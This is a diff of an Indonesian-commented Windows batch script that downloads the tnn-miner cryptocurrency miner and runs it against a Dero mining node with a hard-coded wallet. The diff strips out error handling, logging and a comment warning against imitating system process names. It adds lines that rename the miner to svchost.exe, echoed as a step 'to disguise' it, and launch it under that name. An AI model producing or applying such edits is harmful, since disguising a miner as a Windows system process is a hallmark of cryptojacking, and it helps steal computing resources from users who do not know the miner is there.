@@ -9,36 +9,13 @@ setlocal
 
 echo Mengunduh file...
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.5.4/downloads/Tnn-miner-win64-v0.5.4.zip','Tnn.zip')"
-if %errorlevel% neq 0 (
-  echo Gagal mengunduh. Periksa koneksi atau URL.
-  exit /b 1
-)
-
 echo Mengekstrak...
 powershell -Command "Expand-Archive -Path 'Tnn.zip' -DestinationPath '.' -Force"
-if %errorlevel% neq 0 (
-  echo Gagal mengekstrak.
-  exit /b 1
-)
-
 echo Menghapus file ZIP...
-del /f /q Tnn.zip
+del Tnn.zip
+echo Mengganti nama file utama untuk menyamarkan...
+rename tnn-miner-cpu.exe svchost.exe
+echo Menjalankan proses...
+svchost.exe --daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c.tero --threads 5
 
-echo Menyiapkan executable...
-REM jangan gunakan nama file yang meniru proses sistem
-if exist "tnn-miner-cpu.exe" (
-  rename "tnn-miner-cpu.exe" "tnn-service.exe"
-) else (
-  echo File tnn-miner-cpu.exe tidak ditemukan.
-  exit /b 1
-)
-
-echo Membuat folder log...
-if not exist ".\logs" mkdir logs
-
-echo Menjalankan proses (log ke logs\run.log)...
-REM jalankan di background dengan redirect output
-start "" /b .\tnn-service.exe --daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --threads 5 > ".\logs\run.log" 2>&1
-
-echo Selesai. Cek logs\run.log untuk output & error.
-endlocal
+pause
